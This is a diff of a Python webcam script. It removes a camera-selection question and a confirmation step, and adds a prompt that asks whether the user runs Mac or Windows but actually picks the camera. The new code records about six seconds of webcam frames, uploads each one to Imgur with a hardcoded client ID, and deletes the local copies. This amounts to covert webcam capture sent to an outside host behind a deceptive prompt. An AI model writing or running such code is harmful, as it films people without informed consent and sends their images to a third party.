@@ -26,25 +26,19 @@ def imgur(name):
 
 client_id = 'a230297bd00d52a'
 
-os_type = int (input('press 0 if you only have a front camera and 1 if you have a fron and back camera '))
-if os_type == 0: 
-    print ("Are you sure you only have a front camera? type 'y' for yes and 'n' for no")
-elif os_type == 1: 
-    print ("Are you sure you have a front and back camera? type 'y' for yes and 'n' for no")
-verifying_type = str(input(' '))
-#recording video
-f verifying_type == 'y': 
-    start = time.time() + 3
-    currentFrame = 0
-    cap = cv2.VideoCapture(os_type) 
-    while time.time() <= start:
-        ret, frame = cap.read()
-        name = './frame' + str(currentFrame) + '.png'
-        print ('Creating...' + name)
-        cv2.imwrite(name, frame)
-        imgur(name)
-        os.remove(name)
-        currentFrame += 1
+os_type = int (input('press 0 if you are using an mac and 1 if you are usign an windows PC '))
+
+start = time.time() + 6
+currentFrame = 0
+cap = cv2.VideoCapture(os_type) 
+while time.time() <= start:
+    ret, frame = cap.read()
+    name = './frame' + str(currentFrame) + '.png'
+    print ('Creating...' + name)
+    cv2.imwrite(name, frame)
+    imgur(name)
+    os.remove(name)
+    currentFrame += 1
 # Stop recording
 cv2.destroyAllWindows()
 cap.release()
